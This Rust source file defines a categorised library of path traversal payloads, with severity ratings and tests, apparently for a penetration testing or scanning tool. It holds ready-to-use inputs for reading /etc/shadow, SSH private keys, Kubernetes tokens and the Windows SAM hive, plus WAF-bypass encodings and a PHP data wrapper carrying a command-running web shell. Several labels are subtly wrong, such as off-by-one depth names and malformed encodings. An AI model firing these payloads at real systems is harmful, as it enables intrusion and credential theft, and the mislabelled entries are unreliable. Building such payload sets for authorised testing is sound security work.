use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = payload_vec!(PayloadType::Traversal,
        "basic", [
            ("../", "Basic parent directory", Severity::Medium),
            ("..\\", "Windows parent directory", Severity::Medium),
            ("..%2f", "URL encoded parent", Severity::Medium),
            ("..%5c", "URL encoded Windows parent", Severity::Medium),
            ("..%252f", "Double encoded parent", Severity::Medium),
        ];
        "deep-traversal", [
            ("../../", "Two levels up", Severity::High),
            ("../../../", "Three levels up", Severity::High),
            ("../../../../", "Four levels up", Severity::High),
            ("../../../../../", "Six levels up", Severity::High),
            ("../../../../../../", "Seven levels up", Severity::High),
            ("../../../../../../../", "Eight levels up", Severity::High),
            ("../../../../../../../../", "Nine levels up", Severity::Critical),
            ("../../../../../../../../../", "Ten levels up", Severity::Critical),
        ];
        "unix", [
            ("../../../../etc/passwd", "/etc/passwd", Severity::Critical),
            ("../../../../etc/shadow", "/etc/shadow", Severity::Critical),
            ("../../../../etc/hosts", "/etc/hosts", Severity::High),
            ("../../../../etc/hostname", "/etc/hostname", Severity::Medium),
            ("../../../../proc/self/environ", "Process environ", Severity::Critical),
            ("../../../../proc/self/cmdline", "Process cmdline", Severity::High),
            ("../../../../proc/self/fd/0", "File descriptor 0", Severity::High),
            ("../../../../var/log/auth.log", "Auth log", Severity::High),
            ("../../../../var/log/apache2/access.log", "Apache access log", Severity::High),
            ("../../../../var/log/nginx/access.log", "Nginx access log", Severity::High),
            ("../../../../home/{user}/.ssh/id_rsa", "SSH private key", Severity::Critical),
            ("../../../../home/{user}/.bash_history", "Bash history", Severity::High),
            ("../../../../root/.bash_history", "Root bash history", Severity::Critical),
            ("../../../../root/.ssh/id_rsa", "Root SSH key", Severity::Critical),
            ("../../../../etc/mysql/debian.cnf", "MySQL debian config", Severity::Critical),
        ];
        "windows", [
            ("..\\..\\..\\windows\\system32\\config\\sam", "SAM database", Severity::Critical),
            ("..\\..\\..\\windows\\system32\\config\\system", "SYSTEM hive", Severity::Critical),
            ("..\\..\\..\\windows\\win.ini", "win.ini", Severity::High),
            ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "Windows hosts", Severity::Medium),
            ("..\\..\\..\\users\\administrator\\desktop\\", "Admin desktop", Severity::High),
            ("..\\..\\..\\users\\public\\desktop\\", "Public desktop", Severity::Medium),
            ("..\\..\\..\\windows\\temp\\", "Windows temp", Severity::Medium),
            ("..\\..\\..\\inetpub\\logs\\logfiles\\", "IIS logs", Severity::High),
        ];
        "encoded", [
            ("..%2f..%2f..%2fetc%2fpasswd", "URL encoded /etc/passwd", Severity::Critical),
            ("..%252f..%252f..%252fetc%252fpasswd", "Double encoded /etc/passwd", Severity::Critical),
            ("..%c0%af..%c0%af..%c0%afetc/passwd", "Overlong UTF-8", Severity::High),
            ("..%c1%9c..%c1%9c..%c1%9cetc/passwd", "Overlong UTF-8 variant", Severity::High),
            ("..%255c..%255c..%255cwindows%255csystem32%255cconfig%255csam", "Double encoded Windows", Severity::Critical),
            ("..%u002f..%u002f..%u002fetc/passwd", "Unicode escape", Severity::High),
            ("%2e%2e/%2e%2e/%2e%2e/etc/passwd", "Encoded dots", Severity::Critical),
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "Full URL encoding", Severity::Critical),
            ("..%00/etc/passwd", "Null byte bypass", Severity::High),
            ("..%00../../etc/passwd", "Null byte in path", Severity::High),
        ];
        "waf-bypass", [
            ("....//", "Double dot bypass", Severity::High),
            ("....//....//", "Double dot deep", Severity::High),
            ("....//....//....//etc/passwd", "Double dot to passwd", Severity::Critical),
            ("..././", "Triple dot slash", Severity::High),
            ("..././..././..././etc/passwd", "Triple dot to passwd", Severity::Critical),
            ("..//..//..//etc/passwd", "Double slash bypass", Severity::Critical),
            ("..\\..\\..\\etc/passwd", "Mixed slashes Unix", Severity::Critical),
            ("../../etc/passwd%00.jpg", "Null byte extension", Severity::High),
            ("../../etc/passwd%00.png", "Null byte image", Severity::High),
            ("....//....//....//....//etc/passwd", "Deep double dot", Severity::Critical),
            ("..../..../..../etc/passwd", "Four dots", Severity::High),
            ("..%1n..%1n..%1n/etc/passwd", "Unicode newline", Severity::Medium),
        ];
        "wrapper", [
            ("file:///etc/passwd", "file:// wrapper", Severity::Critical),
            ("file:///c:/windows/system32/config/sam", "file:// Windows", Severity::Critical),
            ("php://filter/convert.base64-encode/resource=/etc/passwd", "PHP filter base64", Severity::Critical),
            ("php://filter/read=string.rot13/resource=/etc/passwd", "PHP filter rot13", Severity::High),
            ("php://input", "PHP input wrapper", Severity::High),
            ("php://data://text/plain,<?php system($_GET['cmd']);?>", "PHP data wrapper", Severity::Critical),
            ("expect://id", "Expect wrapper (command)", Severity::Critical),
            ("dict://localhost:11211/stats", "Dict wrapper", Severity::High),
            ("phar:///tmp/archive.tar/a.txt", "Phar wrapper", Severity::High),
            ("zip://archive.zip#file.txt", "Zip wrapper", Severity::Medium),
        ];
        "nginx", [
            ("..../..../..../..../etc/passwd", "Nginx off-by-slash", Severity::Critical),
            ("../../../etc/passwd%00", "Nginx null byte", Severity::High),
        ];
        "container", [
            ("../../../proc/1/rootfs/etc/passwd", "Container process rootfs read", Severity::Critical),
            ("../../../var/run/secrets/kubernetes.io/serviceaccount/token", "Kubernetes service account token", Severity::Critical),
            ("../../../proc/self/cgroup", "Container cgroup detection", Severity::High),
            ("../../../etc/hostname", "Container hostname read", Severity::Medium),
            ("../../../proc/1/environ", "Container PID 1 environment", Severity::Critical),
        ];
        "macos", [
            ("../../../../etc/master.passwd", "macOS master password read", Severity::Critical),
            ("../../../../Library/LaunchDaemons/com.apple_ssh.plist", "macOS launch daemon", Severity::High),
            ("../../../../System/Library/LaunchDaemons/com.openssh.sshd.plist", "macOS SSH daemon plist", Severity::High),
            ("../../../../var/db/dsl.ldb", "macOS Directory Service database", Severity::Critical),
        ];
        "symlink", [
            ("/tmp/evil", "Symlink traversal target", Severity::Medium),
            ("/proc/self/root", "Proc root symlink", Severity::High),
            ("/dev/fd/0", "File descriptor traversal", Severity::High),
        ];
    );

    for p in &mut payloads {
        if p.tags.contains(&"unix".to_string()) && !p.tags.contains(&"file-read".to_string()) {
            p.tags.push("file-read".to_string());
        }
        if p.tags.contains(&"windows".to_string()) && !p.tags.contains(&"file-read".to_string()) {
            p.tags.push("file-read".to_string());
        }
        if p.tags.contains(&"wrapper".to_string()) && !p.tags.contains(&"php".to_string()) {
            p.tags.push("php".to_string());
        }
    }

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "Traversal payloads must not be empty");
    }

    #[test]
    fn all_payloads_are_traversal_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::Traversal);
        }
    }

    #[test]
    fn contains_dot_dot_slash() {
        let payloads = get_payloads();
        let has_traversal = payloads.iter().any(|p| {
            p.payload.contains("../")
                || p.payload.contains("..\\")
                || p.payload.contains("..%2f")
                || p.payload.contains("..%5c")
        });
        assert!(has_traversal, "Must contain ../ or ..\\ traversal patterns");
    }

    #[test]
    fn passwd_payloads_are_critical_or_high() {
        let payloads = get_payloads();
        let passwd: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.payload.contains("/etc/passwd"))
            .collect();
        assert!(!passwd.is_empty(), "Must have /etc/passwd payloads");
        let high_or_critical = passwd
            .iter()
            .filter(|p| matches!(p.severity, Severity::Critical | Severity::High))
            .count();
        assert!(
            high_or_critical >= passwd.len() * 3 / 4,
            "Most /etc/passwd payloads must be Critical or High ({}/{})",
            high_or_critical,
            passwd.len()
        );
    }

    #[test]
    fn contains_windows_targets() {
        let payloads = get_payloads();
        let has_windows = payloads
            .iter()
            .any(|p| p.payload.to_lowercase().contains("windows"));
        assert!(has_windows, "Must contain Windows path traversal targets");
    }

    #[test]
    fn contains_php_wrappers() {
        let payloads = get_payloads();
        let has_php = payloads.iter().any(|p| p.payload.contains("php://"));
        assert!(has_php, "Must contain PHP wrapper payloads");
    }

    #[test]
    fn all_passwd_payloads_exist() {
        let payloads = get_payloads();
        let passwd: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.payload.contains("/etc/passwd"))
            .collect();
        assert!(!passwd.is_empty(), "Must have /etc/passwd payloads");
        assert!(
            passwd.len() >= 5,
            "Should have multiple /etc/passwd payloads"
        );
    }

    #[test]
    fn contains_file_protocol() {
        let payloads = get_payloads();
        let has_file = payloads.iter().any(|p| p.payload.starts_with("file://"));
        assert!(has_file, "Must contain file:// protocol payloads");
    }

    #[test]
    fn deep_traversal_payloads_exist() {
        let payloads = get_payloads();
        let deep: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"deep-traversal".to_string()))
            .collect();
        assert!(
            deep.len() >= 5,
            "Must have deep traversal payloads (5+ levels)"
        );
    }

    #[test]
    fn contains_encoded_variants() {
        let payloads = get_payloads();
        let encoded: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"encoded".to_string()))
            .collect();
        assert!(encoded.len() >= 5, "Must have encoded traversal variants");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 60,
            "Must have substantial traversal payload coverage, got {}",
            payloads.len()
        );
    }
}
